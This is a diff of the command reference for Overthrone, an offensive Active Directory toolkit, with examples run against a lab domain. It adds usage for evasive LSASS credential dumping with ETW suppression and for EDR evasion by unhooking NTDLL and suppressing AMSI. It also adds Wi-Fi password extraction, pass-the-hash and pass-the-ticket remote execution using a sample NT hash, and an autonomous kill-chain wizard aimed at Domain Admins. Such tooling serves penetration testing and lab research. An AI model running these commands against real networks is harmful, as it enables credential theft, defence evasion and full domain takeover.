@@ -1,4 +1,4 @@
-# Overthrone v0.4.3 — Complete Command Reference
+# Overthrone v0.4.5 — Complete Command Reference
 
 > Real usage examples for every command across all 9 crates.
 > Tested against GOAD-Light (WS2019 DCs) — `sevenkingdoms.local` (192.168.57.10)
@@ -49,6 +49,10 @@ Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We use `ovt` bec
 - [DCShadow Rogue DC Push (`ovt dcshadow`)](#dcshadow-rogue-dc-push-ovt-dcshadow)
 - [Local Credential Dumpers (`ovt local-creds`)](#local-credential-dumpers-ovt-local-creds)
 - [Sherlock Vuln Enumeration (`ovt sherlock`)](#sherlock-vuln-enumeration-ovt-sherlock)
+- [LSASS Dump (`ovt dump-lsass`)](#lsass-dump-ovt-dump-lsass)
+- [Credential Guard Check (`ovt cg`)](#credential-guard-check-ovt-cg)
+- [EDR Assessment & Evasion (`ovt edr`)](#edr-assessment--evasion-ovt-edr)
+- [Wi-Fi Credential Extraction (`ovt wifi`)](#wi-fi-credential-extraction-ovt-wifi)
 - [ACL/DACL Abuse (`ovt acl`)](#acldacl-abuse-ovt-acl)
 - [GPO Abuse (`ovt gpo`)](#gpo-abuse-ovt-gpo)
 
@@ -96,6 +100,10 @@ These flags apply to most subcommands:
 -P, --pass-list <FILE>          # File with passwords (one per line)
     --user-pass-list <FILE>     # File with user:pass or user:ntlm_hash pairs
     --ldaps                     # Use LDAP over SSL (port 636)
+
+# Wordlist Configuration
+    OT_SECLISTS_DIR              # Path to SecLists root directory
+    OT_WORDLIST_DIR              # Path to custom wordlist directory
 
 # Output
     --output-format <FMT>       # text|json|csv (default: text)
@@ -361,11 +369,11 @@ ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local \
 
 | Subcommand | Flags | What it does |
 |---|---|---|
-| `roast` | `--spn` (optional) | Kerberoast SPN accounts |
+| `roast` | `--spn` (optional), `--downgrade-rc4` | Kerberoast SPN accounts |
 | `asrep-roast` | `--userlist`/`-U` (optional) | AS-REP roast no-preauth accounts |
-| `user-enum` | `--userlist`, `--output`, `--delay`, `--concurrency`, `--use-ldap` | Zero-knowledge username enumeration |
+| `user-enum` | `--userlist`, `--output`, `--delay`, `--concurrency`, `--use-ldap` | Zero-knowledge username enumeration (auto-discovers SecLists username wordlists) |
 | `get-tgt` | | Request a TGT |
-| `get-tgs` | `--spn` (required) | Request a TGS for a specific SPN |
+| `get-tgs` | `--spn` (required), `--impersonate` (optional), `--altservice` (optional) | Request TGS, or perform S4U impersonation with `--impersonate` |
 
 ---
 
@@ -593,6 +601,82 @@ ovt sherlock -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --min
 | Subcommand (implicit) | Flags | What it does |
 |---|---|---|
 | `sherlock` | `--cves` (comma-separated), `--format` (json/csv/text), `--min-risk` (low/medium/high/critical) | KB discovery, CVE cross-reference, risk scoring, exploit recommendations |
+
+---
+
+## LSASS Dump (`ovt dump-lsass`)
+
+Evasive in-process LSASS credential dump using raw syscalls (EDR/Defender bypass).
+
+```bash
+# Auto-detect method and dump LSASS
+ovt dump-lsass -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Specify output file
+ovt dump-lsass -d sevenkingdoms.local -u vagrant -p vagrant -o /tmp/lsass.dmp
+
+# Force minidump method (comsvcs.dll in-process)
+ovt dump-lsass -d sevenkingdoms.local -u vagrant -p vagrant --method minidump
+
+# Force direct method (NtReadVirtualMemory page walk)
+ovt dump-lsass -d sevenkingdoms.local -u vagrant -p vagrant --method direct
+
+# Specify LSASS PID
+ovt dump-lsass -d sevenkingdoms.local -u vagrant -p vagrant --pid 672
+
+# Skip ETW suppression
+ovt dump-lsass -d sevenkingdoms.local -u vagrant -p vagrant --no-etw-suppress
+```
+
+| Flag | Default | What it does |
+|---|---|---|
+| `-o`, `--output` | none (memory-only) | Output file path for the minidump |
+| `--method` | `auto` | `auto`, `minidump`, `direct` |
+| `--pid` | auto-detected | LSASS process ID |
+| `--no-etw-suppress` | `false` | Skip ETW suppression |
+
+---
+
+## Credential Guard Check (`ovt cg`)
+
+Check Credential Guard status on a target host.
+
+```bash
+# Check Credential Guard status
+ovt cg --target 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+```
+
+---
+
+## EDR Assessment & Evasion (`ovt edr`)
+
+Assess and evade EDR solutions on target hosts.
+
+```bash
+# Assess EDR landscape -- detect hooked functions, EDR processes/drivers, ETW, AMSI
+ovt edr assess -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# Apply stealth profile -- unhook NTDLL, abolish ETW, suppress AMSI
+ovt edr evade -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+```
+
+| Subcommand | What it does |
+|---|---|
+| `assess` | Detect hooked functions, EDR processes/drivers, ETW, AMSI |
+| `evade` | Unhook NTDLL, abolish ETW, suppress AMSI |
+
+---
+
+## Wi-Fi Credential Extraction (`ovt wifi`)
+
+Alias: `wlan`.
+
+Extract saved Wi-Fi profile credentials from a target host.
+
+```bash
+# Extract Wi-Fi profiles and saved passwords
+ovt wifi -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+```
 
 ---
 
@@ -968,7 +1052,10 @@ ovt move crawl -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --p
 ## SMB Operations (`ovt smb`)
 
 ```bash
-# List shares on a target
+# List shares on a target (null session / anonymous)
+ovt smb shares --target 192.168.57.10
+
+# List shares with credentials
 ovt smb shares --target 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
 
 # Check admin access on multiple targets
@@ -1008,6 +1095,18 @@ ovt exec --target 192.168.57.10 --command "ipconfig /all" --method psexec
 ovt exec --target 192.168.57.10 --command "hostname" --method wmiexec
 ovt exec --target 192.168.57.10 --command "net user" --method winrm
 ovt exec --target 192.168.57.10 --command "dir C:\" --method smbexec
+
+# Pass-the-Hash (NTLM hash auth)
+ovt exec --target 192.168.57.10 --command "whoami" -d sevenkingdoms.local -u Administrator \
+  -A hash --nt-hash dd4592176bb3f58eea4e87a8f0eaf270
+
+# Pass-the-Ticket (Kerberos ticket auth)
+ovt exec --target 192.168.57.10 --command "whoami" -d sevenkingdoms.local -u Administrator \
+  -A ticket --ticket ./Administrator@cifs_DC01@DOMAIN.ccache
+
+# Target IP bypass (skip DNS resolution)
+ovt exec --target DC01.local --target-ip 192.168.57.10 --command "whoami" \
+  -d sevenkingdoms.local -u vagrant -p vagrant
 ```
 
 | Flag | Default | What it does |
@@ -1015,6 +1114,10 @@ ovt exec --target 192.168.57.10 --command "dir C:\" --method smbexec
 | `--method`, `-m` | `auto` | `auto`, `psexec`, `smbexec`, `wmiexec`, `winrm` |
 | `--target`, `-t` | required | Target host |
 | `--command`, `-c` | required | Command to execute |
+| `--target-ip` | none | IP for SMB connection (bypasses DNS) |
+| `-A`, `--auth-method` | `password` | `password`, `hash`, `ticket` |
+| `--nt-hash` | none | NTLM hash for PtH |
+| `--ticket` | none | Kerberos ticket file (ccache/kirbi) |
 
 | Method | Protocol | Notes |
 |---|---|---|
@@ -1396,9 +1499,11 @@ ovt tui --bind 0.0.0.0 --tls-cert ./cert.pem --tls-key ./key.pem
 
 ---
 
-## Wizard Auto-Pwn (`ovt wizard`)
+## Wizard (`ovt wizard`)
 
-The successor to auto-pwn. Same kill chain, but with guardrails -- pauses after each stage for operator review, supports session resume, and a Q-learning brain that gets smarter the more you use it.
+Interactive or autonomous AD kill-chain wizard. Supports TUI (click-based), headless CLI, session resume, and Q-learning adaptive mode.
+
+### CLI Wizard (Headless / Autonomous)
 
 ```bash
 # Full automated attack chain
@@ -1419,14 +1524,20 @@ ovt wizard --target DA --dc-host 192.168.57.10 -d sevenkingdoms.local -u vagrant
 # Dry run (assess without exploitation)
 ovt wizard -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --dry-run
 
-# Specify output directory
-ovt wizard -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --output-dir ./assessment
+# NTLM hash authentication (PtH)
+ovt wizard -H 192.168.57.10 -d sevenkingdoms.local -u Administrator --nt-hash dd4592176bb3f58eea4e87a8f0eaf270
 ```
 
 | Flag | Default | What it does |
 |---|---|---|
-| `--target`, `-t` | required | Goal: `"Domain Admins"`, `"ntds"`, hostname, username |
+| `--target`, `-t` | (auto) | Goal: `"Domain Admins"`, `"ntds"`, hostname, username |
+| `-H` / `--dc-host` | (env: OT_DC_HOST) | Domain controller IP |
+| `-d` / `--domain` | (env: OT_DOMAIN) | Domain FQDN |
+| `-u` / `--username` | (env: OT_USERNAME) | Username |
+| `-p` / `--password` | (env: OT_PASSWORD) | Password |
+| `--nt-hash` | (env: OT_NT_HASH) | NTLM hash for PtH |
 | `--resume` | none | Resume from checkpoint JSON |
+| `--from-session` | none | Resume from saved engagement session |
 | `--checkpoint-dir` | `./checkpoints` | Directory for checkpoint files |
 | `--skip-enum` | `false` | Skip enumeration (requires `--from-file`) |
 | `--from-file` | none | Load previous enumeration state JSON |
@@ -1443,12 +1554,18 @@ ovt wizard -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --outpu
 
 ### TUI Wizard (Interactive Click-Based Mode)
 
-Launch the full interactive TUI wizard with mouse support. Select modules by clicking, configure targets with input forms, and watch execution in real-time.
+Launch the full interactive TUI wizard with mouse support. Select modules by clicking, configure targets in the Target Config tab, and watch execution in real-time. **No credentials required at launch** -- fill them in the TUI form.
 
 ```bash
 # Launch TUI wizard
 ovt wizard --tui
+
+# Or set credentials via env vars (TUI form is pre-filled)
+export OT_DC_HOST=192.168.57.10 OT_DOMAIN=sevenkingdoms.local OT_USERNAME=vagrant OT_PASSWORD=vagrant
+ovt wizard --tui
 ```
+
+> **How it works:** The TUI presents 8 attack categories with 50 modules. Navigate to Target Config (Tab key), fill in DC/Domain/Username/Password, select modules, and press `R` to execute. Credentials can also be set via env vars before launch.
 
 **TUI Keyboard Controls:**
 
@@ -1481,7 +1598,7 @@ ovt wizard --tui
 |---|---|
 | **Main Menu** | 8 color-coded attack categories with module counts |
 | **Category Sub-menus** | Toggle individual modules with checkboxes |
-| **Target Config** | Editable form for DC, Domain, Username, Password, NT Hash |
+| **Target Config** | Editable form for DC, Domain, Username, Password, NT Hash, Wordlist, Output Dir |
 | **Running** | Live execution log |
 | **Results** | Scrollable results viewer |
 
